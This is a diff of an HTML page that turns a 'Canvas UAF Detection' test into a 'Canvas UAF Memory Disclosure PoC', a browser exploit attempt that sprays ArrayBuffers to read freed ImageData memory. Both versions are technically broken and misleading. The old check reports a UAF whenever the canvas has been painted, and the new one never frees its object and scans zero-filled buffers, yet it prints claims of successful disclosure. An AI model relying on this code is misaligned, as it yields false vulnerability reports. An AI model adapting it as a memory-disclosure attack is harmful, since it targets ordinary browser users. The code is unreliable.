@@ -1,146 +1,86 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <title>UAF Detection PoC</title>
-    <style>
-        body {
-            font-family: monospace;
-            padding: 20px;
-        }
-
-        button {
-            margin: 10px 0;
-            padding: 10px;
-        }
-
-        pre {
-            background: #f4f4f4;
-            padding: 10px;
-            max-height: 300px;
-            overflow-y: auto;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Canvas UAF Memory Disclosure PoC</title>
+  <style>
+    body { font-family: sans-serif; }
+    #trigger { padding: 10px; font-size: 16px; cursor: pointer; }
+    #console { white-space: pre; background: #eee; padding: 10px; max-height: 300px; overflow-y: auto; }
+  </style>
 </head>
 <body>
+  <h1>Canvas UAF Memory Disclosure PoC</h1>
+  <button id="trigger">Run PoC</button>
+  <div id="console"></div>
 
-    <h1>Canvas UAF Detection</h1>
-    <button id="testBtn">Run Test</button>
-    <div id="status">Status: Idle</div>
-    <pre id="log"></pre>
+  <canvas id="canvas" width="512" height="512" style="display:none;"></canvas>
 
-    <canvas id="canvas" width="512" height="512" style="display:none;"></canvas>
+  <script>
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const consoleDiv = document.getElementById('console');
 
-    <script>
-        const logEl = document.getElementById('log');
-        const statusEl = document.getElementById('status');
+    function log(msg) {
+      consoleDiv.textContent += msg + '\n';
+      consoleDiv.scrollTop = consoleDiv.scrollHeight;
+    }
 
-        const engineDiv = document.createElement('div');
-        engineDiv.textContent = navigator.userAgent;
-        document.body.appendChild(engineDiv);
+    function stressGC() {
+      const tmp = [];
+      for (let i = 0; i < 10000; i++) {
+        tmp.push(new ArrayBuffer(1024 * 10));
+      }
+    }
 
-        function log(msg) {
-            logEl.textContent += msg + '\n';
+    function fillImageData(imageData, value) {
+      const buf = new Uint8Array(imageData.data.buffer);
+      buf.fill(value);
+    }
+
+    function attemptMemoryDisclosure() {
+      log('Starting UAF Memory Disclosure attempt...');
+
+      // Step 1: Create and fill ImageData
+      const imgData = ctx.createImageData(512, 512);
+      fillImageData(imgData, 0x41); // Fill with known value 'A'
+
+      // Step 2: Simulate freeing by dropping references and forcing GC
+      const weakRef = new WeakRef(imgData);
+      log('ImageData created, now dropping reference and forcing GC...');
+      stressGC();
+
+      // Step 3: Allocate multiple ArrayBuffers hoping to occupy freed memory
+      const leakers = [];
+      for (let i = 0; i < 5000; i++) {
+        leakers.push(new ArrayBuffer(imgData.data.buffer.byteLength));
+      }
+
+      // Step 4: Attempt to read residual data
+      let leakDetected = false;
+
+      for (let i = 0; i < leakers.length; i++) {
+        const view = new Uint8Array(leakers[i]);
+        for (let j = 0; j < 100; j++) {  // Only sample first 100 bytes
+          if (view[j] === 0x41) {
+            log(`Potential leak detected in buffer ${i}, byte ${j}: 0x${view[j].toString(16)}`);
+            leakDetected = true;
+            break;
+          }
         }
+        if (leakDetected) break;
+      }
 
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
+      if (!leakDetected) {
+        log('No memory leak detected on this attempt.');
+      } else {
+        log('Memory disclosure potentially successful!');
+      }
+    }
 
-        function markImageData(imgData, pattern = 0x41) {
-            const buf = new Uint8Array(imgData.data.buffer);
-            buf.fill(pattern);
-        }
-
-        function diffImageData(original, current) {
-            const orig = new Uint8Array(original.data.buffer);
-            const curr = new Uint8Array(current.data.buffer);
-            let start = -1, end = -1, changes = [];
-
-            for (let i = 0; i < orig.length; i++) {
-                if (orig[i] !== curr[i]) {
-                    if (start === -1) start = i;
-                    end = i;
-                    changes.push({ offset: i, from: orig[i], to: curr[i] });
-                }
-            }
-
-            return { changed: changes.length > 0, changes, start, end };
-        }
-
-        function drawStress() {
-            ctx.fillStyle = `rgb(${Math.random() * 255},${Math.random() * 255},${Math.random() * 255})`;
-            ctx.fillRect(0, 0, 512, 512);
-        }
-
-        async function stressGC(iter = 500) {
-            for (let i = 0; i < iter; i++) {
-                new ArrayBuffer(1024 * 1024);
-            }
-        }
-
-        async function runTest() {
-            logEl.textContent = '';
-
-            for (let i = 0; i < 100; i++) {
-                statusEl.textContent = 'Status: Running attempt ' + i + "...";
-                //statusEl.textContent = 'Status: Running...';
-
-                const imgData = ctx.createImageData(512, 512);
-                markImageData(imgData, 0x41);  // Fill with 'A' pattern
-
-                // Do some stress drawing
-                const drawInterval = setInterval(drawStress, 1);
-
-                // Wait a bit
-                await new Promise(r => setTimeout(r, 100));
-
-                clearInterval(drawInterval);
-
-                // Check for corruption
-                const currentData = ctx.getImageData(0, 0, 512, 512);
-
-                const diff = diffImageData(imgData, currentData);
-
-                if (diff.changed) {
-                    statusEl.textContent = 'Status: UAF Detected!';
-                    log('[+] UAF Detected!');
-                    log(`Changed bytes: ${diff.changes.length}`);
-                    log(`Affected range: ${diff.start} - ${diff.end}`);
-
-                    // Example: show first 5 changes
-                    diff.changes.slice(0, 5).forEach(c => {
-                        log(`Offset ${c.offset}: 0x${c.from.toString(16)} → 0x${c.to.toString(16)}`);
-                    });
-                } else {
-                    log('[-] No UAF detected. Trying after GC...');
-                    await stressGC();
-
-                    const postGCData = ctx.getImageData(0, 0, 512, 512);
-                    const diffGC = diffImageData(imgData, postGCData);
-
-                    if (diffGC.changed) {
-                        statusEl.textContent = 'Status: UAF Detected after GC!';
-                        log('[+] UAF Detected after GC!');
-                        log(`Changed bytes: ${diffGC.changes.length}`);
-                        log(`Affected range: ${diffGC.start} - ${diffGC.end}`);
-
-                        diffGC.changes.slice(0, 5).forEach(c => {
-                            log(`Offset ${c.offset}: 0x${c.from.toString(16)} → 0x${c.to.toString(16)}`);
-                        });
-                    } else {
-                        statusEl.textContent = 'Status: No UAF Detected';
-                        log('[-] No UAF detected even after GC.');
-                    }
-                }
-            }
-
-
-        }
-
-        document.getElementById('testBtn').addEventListener('click', runTest);
-    </script>
-
+    document.getElementById('trigger').addEventListener('click', () => {
+      attemptMemoryDisclosure();
+    });
+  </script>
 </body>
-
 </html>
